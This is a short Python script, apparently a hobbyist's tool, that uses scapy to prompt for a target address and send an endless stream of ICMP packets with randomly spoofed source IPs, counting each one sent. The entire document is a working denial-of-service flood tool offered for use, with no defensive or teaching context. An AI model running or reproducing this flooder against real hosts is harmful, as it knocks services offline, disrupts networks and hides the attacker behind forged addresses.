import sys, random, threading
from scapy.all import send, IP, TCP, ICMP
#code by HowFan
n = 0
tar = input("input target : ")
while True:
    psrc = str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "." + str(random.randint(1, 254)) + "." + str(random.randint(1, 254))
    pdst = tar
    send(IP(src = psrc, dst = pdst) / ICMP())
    n+=1
    print("send" + str(n))
